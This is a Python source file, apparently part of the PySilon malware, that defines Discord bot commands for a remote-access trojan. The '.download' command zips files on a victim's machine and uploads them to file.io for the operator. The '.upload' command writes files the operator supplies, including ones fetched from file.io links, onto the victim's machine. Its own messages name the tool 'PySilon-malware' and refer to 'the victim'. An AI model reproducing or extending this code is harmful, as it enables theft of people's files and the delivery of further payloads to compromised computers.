import resources.modules.misc as pysilon_misc
from filesplit.merge import Merge
from shutil import copy2, rmtree
from bs4 import BeautifulSoup
from zipfile import ZipFile
import requests
import os

@client.command(name='download')
async def file_downloading(ctx, file_to_download=None):
    await ctx.message.delete()
    if file_to_download != None:
        if os.path.exists(file_to_download):
            target_file = file_to_download
            if os.path.isdir(target_file):
                target_file += '.zip'
                with ZipFile(target_file,'w') as zip:
                    for file in pysilon_misc.get_all_file_paths('.'.join(target_file.split('.')[:-1])):
                        try:
                            zip.write(file)
                        except Exception as e:
                            ctx.send(e)
                            pass
            await ctx.send("```Uploading to file.io... This can take a while depending on the file size and the victim's internet speed...```")
            data = {'file': open(target_file, 'rb')}
            url = 'https://file.io/'
            response = requests.post(url, files=data)
            data = response.json()
            embed = discord.Embed(title=f"🟢 {file_to_download}",description=f"Click [here](<{data['link']}>) to download.", colour=discord.Colour.green())
            embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
            await ctx.send(embed=embed)
            await ctx.send('Warning: The file will be removed from file.io right after the first download.')
        else:
            embed = discord.Embed(title="📛 Error",description=f'```❗ File or directory not found.```', colour=discord.Colour.red())
            embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
            await ctx.send(embed=embed)
    else:
        embed = discord.Embed(title="📛 Error",description=f'```Syntax: .download <file-or-directory>```', colour=discord.Colour.red())
        embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
        await ctx.send(embed=embed)

@client.command(name='upload')
async def file_uploading(ctx, argument=None, second_arg=None):
    await ctx.message.delete()

    if argument == 'small':
        embed = discord.Embed(title='📤 Waiting for file...', description='Send the file you wish to upload here.', colour=discord.Colour.blue())
        embed.set_author(name='PySilon Malware', icon_url='https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png')
        await ctx.send(embed=embed)
        def check(m):
            return m.attachments and m.channel == ctx.channel

        msg = await client.wait_for('message', check=check)
        try:
            filename = msg.attachments[0].filename
            await msg.attachments[0].save(fp=filename)
            embed = discord.Embed(title=f"🟢 Success",description=f"Your file has been sucessfully uploaded.", colour=discord.Colour.green())
            embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
            await ctx.send(embed=embed)
        except: await ctx.send("```File failed to upload :/```")

    elif argument == 'big':
        if second_arg != None:
            embed = discord.Embed(title='📤 Waiting for file...', description='Please upload your file to [file.io](https://file.io/) and send the link here.', colour=discord.Colour.blue())
            embed.set_author(name='PySilon Malware', icon_url='https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png')
            await ctx.send(embed=embed)

            def check(m):
                return m.content and m.channel == ctx.channel
            msg = await client.wait_for('message', check=check)

            target_file = msg.content
            if not target_file.startswith("https://file.io"): return await ctx.send("```Your message did not contain a file.io link.```")

            html_content = f'''
            <a href="{target_file}" download="download" title="Download"></a>
            '''
            soup = BeautifulSoup(html_content, 'html.parser')
            download_link = soup.find('a')['href']
            response = requests.get(download_link)

            if response.status_code == 200:
                with open(f'{second_arg}', 'wb') as f:
                    f.write(response.content)
                embed = discord.Embed(title=f"🟢 Success",description=f"Your file has been sucessfully uploaded.", colour=discord.Colour.green())
                embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                await ctx.send(embed=embed)
            else:
                await ctx.send("```File failed to upload :/```")

        else:
            embed = discord.Embed(title="📛 Error",description=f'```Syntax: .upload big <file_name.ext>```', colour=discord.Colour.red())
            embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
            await ctx.send(embed=embed)
        
    else:
        embed = discord.Embed(title="📛 Error",description=f'```Syntax: .upload <small / big>```', colour=discord.Colour.red())
        embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
        await ctx.send(embed=embed)
        
    